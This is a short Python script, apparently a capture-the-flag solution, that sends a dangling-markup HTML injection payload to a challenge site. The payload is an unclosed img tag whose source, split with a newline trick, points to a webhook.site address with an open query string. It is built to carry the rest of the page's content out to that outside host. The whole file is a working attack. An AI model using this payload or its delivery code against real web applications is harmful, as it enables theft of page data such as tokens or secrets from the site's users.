import requests
import urllib.parse

payload = '<img src="/\n/webhook.site/c7e8f703-1ee1-417a-921e-68c113778ff6?t='
url = 'https://9cf8d8cc310eff6b.chal.ctf.ae/?content=' + urllib.parse.quote(payload)
r = requests.get(url)
print("Status:", r.status_code)
print("Response content:")
print(r.text.encode('ascii', errors='replace').decode('ascii'))
